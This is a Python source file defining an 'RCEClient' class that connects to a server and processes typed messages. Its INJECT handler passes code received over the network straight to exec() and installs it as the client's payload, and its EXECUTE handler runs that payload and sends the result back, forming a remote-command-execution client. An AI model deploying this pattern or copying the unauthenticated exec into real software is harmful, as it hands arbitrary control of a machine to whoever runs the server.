import sys
from typing import Any

from src.core.base_client import BaseClientThread
from src.core.logger import logger
from src.core.message import MessageType, Message


class RCEClient(BaseClientThread):

    def __init__(self, host='localhost', port=6000):
        super().__init__()
        self.connect_to_server(host, port)

    def run(self):
        logger.info("Listening for messages...")
        while self.is_connected():
            if message := self.receive_message():
                logger.info(f"Received message from {message.get_sender()}:\n{message}")
                if message.is_type(MessageType.HEARTBEAT):
                    logger.info(f"Received heartbeat from {message.get_sender()}")
                elif message.is_type(MessageType.DATA):
                    logger.info(f"Received data from {message.get_sender()}:\n{message}")
                elif message.is_type(MessageType.CONNECT):
                    logger.info(f"Received connect from {message.get_sender()}:\n{message}")
                elif message.is_type(MessageType.DISCONNECT):
                    logger.info(f"Received disconnect from {message.get_sender()}")
                    self.close()
                elif message.is_type(MessageType.INJECT):
                    logger.info(f"Received inject from {message.get_sender()}:\n{message}")
                    self.inject_payload(message)
                elif message.is_type(MessageType.EXECUTE):
                    logger.info(f"Received execute from {message.get_sender()}:\n{message}")
                    self.execute_payload()
                elif message.is_type(MessageType.ERROR):
                    self.close()
                    logger.info(f"Received error from {message.get_sender()}:\n{message}")
                elif message.is_type(MessageType.NULL):
                    self.close()
                    logger.info(f"DISCONNECTED: Received null packet from {message.get_sender()}")
                else:
                    logger.info(f"Received unknown packet type from {message.get_sender()}: {message.get_type()}")
            else:
                self.close()
                logger.info("Client disconnected.. No data received")

    def payload(self) -> Any:
        return f"No payload has been injected at {self.name}"

    @staticmethod
    def inject_payload(message: Message):
        payload = message.data.decode()
        exec(payload, locals(), globals())
        setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))

    def execute_payload(self):
        message = Message(message_type=MessageType.ECHO, data=self.payload())
        self.send_message(message)
